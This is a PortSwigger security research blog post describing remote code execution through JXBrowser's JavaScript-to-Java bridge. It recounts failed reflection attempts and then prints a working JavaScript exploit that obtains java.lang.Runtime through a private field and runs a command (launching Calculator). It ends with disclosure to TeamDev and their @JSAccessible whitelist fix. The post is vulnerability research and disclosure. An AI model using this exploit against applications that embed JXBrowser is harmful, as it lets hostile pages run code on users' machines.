# RCE in JXBrowser JavaScript/Java bridge

Source: https://portswigger.net/research/rce-in-jxbrowser-javascript-java-bridge
Fetched: 2026-06-28T09:17:28.666488+00:00

RCE in JXBrowser JavaScript/Java bridge

Gareth Heyes

Researcher

@garethheyes

Published: Thursday, 8 December 2016 at 15:18 UTC

Updated: Wednesday, 21 March 2018 at 14:07 UTC

I recently found myself prototyping an experimental scanning technique using JXBrowser, a library for using a PhantomJS-like browser in Java applications. Whilst creating a JavaScript to Java bridge using the JXBrowser library, I wondered if it was possible to achieve remote code execution from a web page attacking the JXBrowser client by calling different classes than the one I supplied. My JavaScript to Java bridge looked something like this:

browser.addScriptContextListener(new ScriptContextAdapter() {

@Override

public void onScriptContextCreated(ScriptContextEvent event) {

Browser browser = event.getBrowser();

JSValue window = browser.executeJavaScriptAndReturnValue("window");

window.asObject().setProperty("someObj", new someJavaClass());

}

});

This example was taken from the JXBrowser web site, basically the code injects a script into the browser instance, retrieves the window object and converts it into a Java JSValue object, then it sets “someObj” on the window and passes the Java object to the JavaScript window object and we have a bridge! The docs said that only public classes could be used. Once we have created a bridge we need some JavaScript to interact with it.

setTimeout(function f(){

if(window.someObj && typeof window.someObj.javaFunction === 'function') {

window.someObj.javaFunction("Called Java function from JavaScript");

} else {

setTimeout(f,0);

}

},0);

We have a setTimeout that checks to see if we have “someObj”, if not it calls itself until we do. My first attempt was to use getRuntime() to see if I could get an instance of the runtime object and execute calc. I called:

window.someObj.getClass().forName('java.lang.Runtime').getRuntime();

I got the following error back:

Neither public field nor method named 'getRuntime' exists in the java.lang.Class Java object.

Maybe it wasn’t possible to call getRuntime? I tried to do something simpler:

window.someObj.getClass().getSuperclass().getName();

This seemed to work. I tried enumerating the methods too.

methods = window.someObj.getClass().getSuperclass().getMethods();

for(i=0;i<methods.length();i++) {

console.log(methods[i].getName());

}

wait

wait

wait

equals

toString

hashCode

getClass

notify

notifyAll

So I could successfully enumerate the methods. I decided to try ProcessBuilder next and see what would happen. But every time I tried to call the constructor it failed. It seems the constructor was expecting a Java Array. Somehow I needed to create a Java array of strings so I could pass it to the ProcessBuilder constructor.

window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance("open","-a Calculator");

//Failed

window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance(["open","-a Calculator"]);

//Failed too

Leaving this problem for a second I tried to create another object that would prove this is vulnerable. I could successfully create an instance of the java.net.Socket class.

window.someObj.getClass().forName("java.net.Socket").newInstance();

I tried calling “connect” on this object but again I had the problem of incorrect types for the arguments. This did prove however that I could create socket objects, I couldn’t use them but I could at least create them. It’s worth noting here that I wasn’t passing any arguments for this to work. Next I tried the java.io.File class but again it failed, I had no option but to use reflection but any time a function was expecting arguments I couldn’t supply it with the correct type. newInstance didn’t work and invoke didn’t work.

I needed help, I needed Java expert help. Fortunately working at Portswigger you are never the smartest one in the room :) I asked Mike and Patrick for their help. I explained the problem that I needed a Java array in order to pass arguments to a function and so we began looking for ways to create arrays in our bridge.

Mike thought maybe using an arraylist was the answer because we could convert it to an array with it’s convenient toArray method.

list = window.someObj.getClass().forName("java.util.ArrayList").newInstance();

list.add("open");

list.add("-a");

list.add("Calculator");

a = list.toArray();

window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance(a));

The call threw a no such method exception and stated that our argument passed was in fact a JSObject. So even though we created an ArrayList the toArray was being converted to a js object by the bridge so the incorrect argument type was being sent to process builder.

We then tried to create an Array instead. Using reflection again we called new instance on the java.lang.reflect.Array but it complained that again we had incorrect argument types, we were sending a double but it was expecting an int. Then we tried to create an int using java.lang.Integer. But again we had the damn argument type problem. Patrick thought we could use the MAX_INT property and create a huge array :) but at least we’d have our int but no, the bridge of course was converting the integer from java into a double.

This is what we tried:

window.someObj.getClass().forName("java.lang.Integer").getDeclaredField("MAX_VALUE").getInt(null);

But we got a null pointer exception and without arguments didn’t work either but this is JavaScript remember I thought why not send 123 and see if it will be accepted as an argument and we thought it wouldn’t work but it did in fact print out our max int. We continued trying to call the Array constructor with our max int value but it of course failed. Then we decided to look at the runtime object and see if we could use the same technique. Mike suggested using getDeclaredField and get the current runtime property and making it accessible because it was a private property and to our great delight we popped the calculator.

field = window.someObj.getClass().forName('java.lang.Runtime').getDeclaredField("currentRuntime");

field.setAccessible(true);

runtime = field.get(123);

runtime.exec("open -a Calculator");

This meant any website rendered in JXBrowser by code employing the JavaScript-Java bridge could potentially take complete control of the client.

We privately reported this issue to TeamDev (the makers of JXBrowser), and they released a patch to support a whitelist of allowed properties/methods using the @JSAccessible annotation. Note that if an application doesn't use the @JSAccessible annotation anywhere the whitelist won't be enforced, and the exploit above will still work.

RCE

JavaScript

Java

Back to all articles

Related Research

Hiding payloads in Java source code strings

23 January 2024

Hiding payloads in Java source code strings

Exploiting prototype pollution in Node without the filesystem

23 March 2023

Exploiting prototype pollution in Node without the filesystem

The seventh way to call a JavaScript function without parentheses

12 September 2022

The seventh way to call a JavaScript function without parentheses

Evading defences using VueJS script gadgets

12 October 2020

Evading defences using VueJS script gadgets
